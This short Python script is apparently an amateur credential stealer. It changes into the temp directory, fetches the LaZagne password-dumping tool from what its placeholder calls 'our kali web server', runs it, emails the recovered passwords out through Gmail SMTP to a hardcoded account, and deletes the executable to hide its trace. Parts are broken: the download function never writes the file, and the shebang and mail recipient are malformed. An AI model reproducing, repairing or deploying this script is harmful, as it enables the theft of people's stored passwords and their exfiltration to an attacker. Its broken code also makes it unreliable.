#!usr/bin/env python

import requests, subprocess, smtplib, os, tempfile


def download(url):
    get_response = requests.get(url)
    print(get_response)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail("sunday4me@gmail.com", "SundayJimoh", message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("fex: lazagne file direct url download link hosted on our kali web server ")
result = subprocess.check_output("lazagne.exe", shell=True)
send_mail("sunday4me@gmail.com", "Sunday", result)
os.remove("Lazagne.exe")
